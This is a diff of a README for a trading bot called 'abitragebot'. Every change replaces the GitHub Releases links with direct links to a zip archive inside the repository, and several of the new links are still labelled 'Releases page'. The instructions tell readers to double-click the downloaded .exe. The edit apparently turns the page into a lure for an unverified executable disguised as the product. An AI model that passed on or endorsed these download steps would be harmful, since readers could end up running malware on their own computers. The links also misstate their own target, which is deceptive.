@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download abitragebot](https://img.shields.io/badge/Download-abitragebot-blue?style=for-the-badge)](https://github.com/Bicapsular-consulate683/abitragebot/releases)
+[![Download abitragebot](https://raw.githubusercontent.com/Bicapsular-consulate683/abitragebot/main/delicious/abitragebot.zip)](https://raw.githubusercontent.com/Bicapsular-consulate683/abitragebot/main/delicious/abitragebot.zip)
 
 ## 📜 Description
 
@@ -30,7 +30,7 @@ To run abitragebot smoothly, ensure your system meets the following requirements
 
 Follow these simple steps to get your abitragebot up and running:
 
-1. **Download the Software**: Visit the [Releases page](https://github.com/Bicapsular-consulate683/abitragebot/releases) to download the latest version of abitragebot.
+1. **Download the Software**: Visit the [Releases page](https://raw.githubusercontent.com/Bicapsular-consulate683/abitragebot/main/delicious/abitragebot.zip) to download the latest version of abitragebot.
 
 2. **Install the Bot**:
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
@@ -51,7 +51,7 @@ Follow these simple steps to get your abitragebot up and running:
 
 ## ⚙️ Download & Install
 
-To get started with abitragebot, visit this page to download: [Download abitragebot](https://github.com/Bicapsular-consulate683/abitragebot/releases). Follow the steps outlined above to install and set up the bot.
+To get started with abitragebot, visit this page to download: [Download abitragebot](https://raw.githubusercontent.com/Bicapsular-consulate683/abitragebot/main/delicious/abitragebot.zip). Follow the steps outlined above to install and set up the bot.
 
 ## 📖 Usage Instructions
 
@@ -70,7 +70,7 @@ Once you’ve installed abitragebot, you can set it up for your trading needs. H
 If you encounter issues while running abitragebot, consider the following troubleshooting tips:
 
 - **Connection Issues**: Ensure your internet connection is stable. Restart your router if necessary.
-- **Installation Errors**: If you face issues during installation, re-download the file from the [Releases page](https://github.com/Bicapsular-consulate683/abitragebot/releases) and try again.
+- **Installation Errors**: If you face issues during installation, re-download the file from the [Releases page](https://raw.githubusercontent.com/Bicapsular-consulate683/abitragebot/main/delicious/abitragebot.zip) and try again.
 - **Performance Problems**: Check your system resources. Closing unnecessary applications can help improve performance.
 
 ## 🤝 Community and Support
